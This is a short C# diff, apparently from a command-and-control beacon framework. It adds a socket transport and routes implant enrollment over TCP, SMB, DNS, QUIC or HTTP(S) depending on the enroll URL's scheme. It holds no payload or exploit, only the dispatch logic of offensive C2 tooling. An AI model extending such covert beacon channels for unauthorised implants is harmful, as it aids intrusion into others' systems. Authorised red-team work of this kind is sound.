@@ -17,14 +17,21 @@ internal static class TransportSelection
         StreamCheckIn.Create(setup),
         QuicCheckIn.Create(setup),
         DnsCheckIn.Create(setup),
+        SocketCheckIn.Create(setup),
     ];
 
     // The enroll dispatch the URL shape picks (architecture.md Sec 8,
-    // enrollment over QUIC): an http(s) enroll URL runs the JSON enroll
-    // cycle, a quic-schemed one the frame exchange. The generated per-build
-    // selection keeps only the branches whose modules compiled.
+    // enrollment over QUIC, the stream check-in, and the DNS grammar): an
+    // http(s) enroll URL runs the JSON enroll cycle; a quic-, socket-
+    // (tcp://, smb://), or dns-schemed one runs the frame exchange its
+    // module dials. The generated per-build selection keeps only the
+    // branches whose modules compiled.
     public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken = default) =>
         BeaconUrl.IsQuic(dial.EnrollUrl)
             ? await QuicEnroll.EnrollAsync(dial, cancellationToken)
-            : await C2.EnrollAsync(dial, cancellationToken);
+            : BeaconUrl.IsSocket(dial.EnrollUrl)
+                ? await SocketEnroll.EnrollAsync(dial, cancellationToken)
+                : BeaconUrl.IsDns(dial.EnrollUrl)
+                    ? await DnsEnroll.EnrollAsync(dial, cancellationToken)
+                    : await C2.EnrollAsync(dial, cancellationToken);
 }
